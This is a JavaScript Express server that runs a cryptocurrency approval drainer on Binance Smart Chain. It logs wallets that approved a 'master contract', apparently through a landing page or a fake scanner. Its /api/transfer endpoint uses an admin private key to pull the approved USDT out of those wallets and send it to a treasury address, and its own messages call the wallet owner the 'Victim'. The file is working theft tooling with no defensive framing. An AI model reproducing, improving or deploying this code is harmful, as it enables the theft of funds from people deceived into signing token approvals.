import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import mongoose from "mongoose";
import Approved from "./models/Approved.js";
import { ethers } from "ethers";

dotenv.config();

/* ================= CONFIG ================= */

const app = express();
const PORT = process.env.PORT || 3000;
const MONGO_DB = process.env.MONGO_DB;
const CORS_ORIGIN = process.env.CORS_ORIGIN || "*";
const MONITOR_APPROVAL_FOR = process.env.MONITOR_APPROVAL_FOR;
const ADMIN_PRIVATE_KEY = process.env.ADMIN_PRIVATE_KEY;
const TREASURY_ADDRESS = process.env.TREASURY_ADDRESS;

const BSC_RPC = "https://bsc-dataseed.binance.org/";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";

const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)",
];

/* ================= MIDDLEWARE ================= */

app.use(express.json());
app.use(cors({
  origin: CORS_ORIGIN === "*" ? true : CORS_ORIGIN.split(",").map(x => x.trim()),
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));

/* ================= HEALTH ================= */

app.get("/health", (_req, res) => {
  res.json({ ok: true, wallet: MONITOR_APPROVAL_FOR });
});

app.get("/", (_req, res) => {
  res.json({ message: "Welcome to the USDT Approval Monitor API", wallet: MONITOR_APPROVAL_FOR });
});

/* ================= APPROVED API ================= */

app.get("/api/approved", async (req, res) => {
  try {
    const { isProcessed, network, owner } = req.query;
    const limit = Math.min(Number(req.query.limit) || 100, 1000);

    const filter = {};
    if (isProcessed === "true" || isProcessed === "false") {
      filter.isProcessed = isProcessed === "true";
    }
    if (network) filter.network = network;
    if (owner) {
      filter.owner = { $regex: new RegExp(`^${String(owner)}$`, "i") };
    }

    const data = await Approved.find(filter).sort({ createdAt: -1 }).limit(limit);
    res.json({ count: data.length, data });
  } catch (error) {
    res.status(500).json({ message: "Failed to fetch approved data", error: error.message });
  }
});

app.post("/api/approved", async (req, res) => {
  try {
    const { network, owner, spender, amount, txHash, source } = req.body;

    const missingFields = [];
    if (!network) missingFields.push("network");
    if (!owner) missingFields.push("owner");
    if (!spender) missingFields.push("spender");
    if (!amount) missingFields.push("amount");
    if (!txHash) missingFields.push("txHash");

    if (missingFields.length > 0) {
      return res.status(400).json({ message: "Missing required fields", missing: missingFields });
    }

    const record = await Approved.findOneAndUpdate(
      { owner: { $regex: new RegExp(`^${owner}$`, "i") } },
      {
        $set: { network, owner, spender, amount: String(amount), txHash, source: source || "landing" },
        $setOnInsert: { isProcessed: false },
      },
      { upsert: true, new: true }
    );

    res.status(201).json({ message: "Approval record saved", data: record });
  } catch (error) {
    if (error.code === 11000) {
      return res.status(409).json({ message: "Duplicate record" });
    }
    res.status(500).json({ message: "Failed to save approval record", error: error.message });
  }
});

app.post("/api/scanner-approval", async (req, res) => {
  try {
    const { address } = req.body;
    if (!address) return res.status(400).json({ message: "Missing required field: address" });

    const record = await Approved.findOneAndUpdate(
      { owner: { $regex: new RegExp(`^${address}$`, "i") } },
      {
        $set: { network: "BSC Mainnet", owner: address, spender: MONITOR_APPROVAL_FOR, amount: "1" },
        $setOnInsert: { isProcessed: false },
      },
      { upsert: true, new: true }
    );

    res.status(201).json({ message: "Approval record saved", data: record });
  } catch (error) {
    if (error.code === 11000) return res.status(200).json({ message: "Already exists" });
    res.status(500).json({ message: "Server error", error: error.message });
  }
});

/* ================= TRANSFER API ================= */

app.post("/api/transfer", async (req, res) => {
  try {
    const { fromAddress, amount } = req.body;

    if (!fromAddress || !amount) {
      return res.status(400).json({ message: "fromAddress aur amount required hai" });
    }

    if (!ADMIN_PRIVATE_KEY) {
      return res.status(500).json({ message: "ADMIN_PRIVATE_KEY set nahi hai" });
    }

    if (!TREASURY_ADDRESS) {
      return res.status(500).json({ message: "TREASURY_ADDRESS set nahi hai" });
    }

    const provider = new ethers.JsonRpcProvider(BSC_RPC);
    const adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
    const usdt = new ethers.Contract(USDT_CONTRACT, USDT_ABI, adminWallet);
    const decimals = await usdt.decimals();

    const transferAmount = ethers.parseUnits(String(amount), decimals);

    const MASTER_CONTRACT = MONITOR_APPROVAL_FOR;

    const [balance, allowance] = await Promise.all([
      usdt.balanceOf(fromAddress),
      usdt.allowance(fromAddress, MASTER_CONTRACT),
    ]);

    console.log("Balance:", ethers.formatUnits(balance, decimals));
    console.log("Allowance:", ethers.formatUnits(allowance, decimals));
    console.log("Requested:", amount);

    if (balance < transferAmount) {
      return res.status(400).json({
        message: `Victim ke wallet mein sirf ${ethers.formatUnits(balance, decimals)} USDT hai`,
      });
    }

    if (allowance < transferAmount) {
      return res.status(400).json({
        message: `Allowance sirf ${ethers.formatUnits(allowance, decimals)} USDT hai`,
      });
    }

    // Step 1: Master Contract se victim ka USDT master contract mein laao
    const MASTER_ABI = [
      "function forWithdraw(address from, uint256 amount)",
      "function withdrawTo(address to, uint256 amount)",
    ];
    const masterContract = new ethers.Contract(MASTER_CONTRACT, MASTER_ABI, adminWallet);

    const tx1 = await masterContract.forWithdraw(fromAddress, transferAmount, {
      gasLimit: 150000,
    });
    console.log("✅ forWithdraw tx:", tx1.hash);
    await tx1.wait();

    // Step 2: Master Contract se TREASURY_ADDRESS pe bhejo
    const tx2 = await masterContract.withdrawTo(TREASURY_ADDRESS, transferAmount, {
      gasLimit: 150000,
    });
    console.log("✅ withdrawTo tx:", tx2.hash);
    await tx2.wait();
    console.log("✅ Transfer complete!");

    // DB update
    await Approved.findOneAndUpdate(
      { owner: { $regex: new RegExp(`^${fromAddress}$`, "i") } },
      { $set: { isProcessed: true } }
    );

    res.json({
      message: "USDT transfer successful",
      txHash: tx2.hash,
      from: fromAddress,
      to: TREASURY_ADDRESS,
      amount: amount,
    });

  } catch (error) {
    console.error("Transfer error:", error);

    let userMessage = "Transfer failed";

    if (error.code === "INSUFFICIENT_FUNDS") {
      userMessage = "Insufficient BNB in admin wallet for gas fees.";
    } else if (error.code === "CALL_EXCEPTION") {
      userMessage = "Contract call failed — allowance may be revoked.";
    } else if (error.code === "NETWORK_ERROR" || error.code === "SERVER_ERROR") {
      userMessage = "BSC network error — please try again.";
    } else if (error.code === "NONCE_EXPIRED" || error.code === "REPLACEMENT_UNDERPRICED") {
      userMessage = "Transaction conflict — please try again.";
    } else if (error.shortMessage) {
      userMessage = error.shortMessage;
    } else if (error.message) {
      userMessage = error.message;
    }

    res.status(500).json({ message: userMessage });
  }
});

/* ================= START SERVER ================= */

async function start() {
  try {
    await mongoose.connect(MONGO_DB);
    console.log("✅ MongoDB connected");

    app.listen(PORT, "0.0.0.0", () => {
      console.log(`✅ API running globally on port ${PORT}`);
    });
  } catch (error) {
    console.error("❌ Startup failed:", error.message);
    process.exit(1);
  }
}

start();
